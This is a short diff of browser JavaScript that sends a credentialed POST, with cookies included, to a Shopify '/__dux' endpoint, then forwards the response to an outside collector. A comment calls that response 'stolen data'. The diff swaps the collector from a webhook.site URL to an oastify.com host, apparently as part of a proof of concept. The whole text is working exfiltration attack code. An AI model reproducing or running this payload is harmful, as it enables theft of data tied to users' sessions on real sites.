@@ -34,7 +34,7 @@
                 ]
             });
 
-            fetch('/__dux', {
+            fetch('https://www.shopify.com/__dux', {
                 method: 'POST',
                 credentials: 'include', // Include cookies in the request
                 headers: {
@@ -55,7 +55,7 @@
             .then(response => response.text()) // Read the response as text
             .then(data => {
                 // Send the stolen data to the webhook.site URL
-                fetch('https://webhook.site/a19d392d-53de-4461-b463-29aac0824a7a', {
+                fetch('http://zy1i6f7f6l68kvaqz9eu9qv960cr0ko9.oastify.com', {
                     method: 'POST',
                     headers: {
                         'Content-Type': 'application/json'
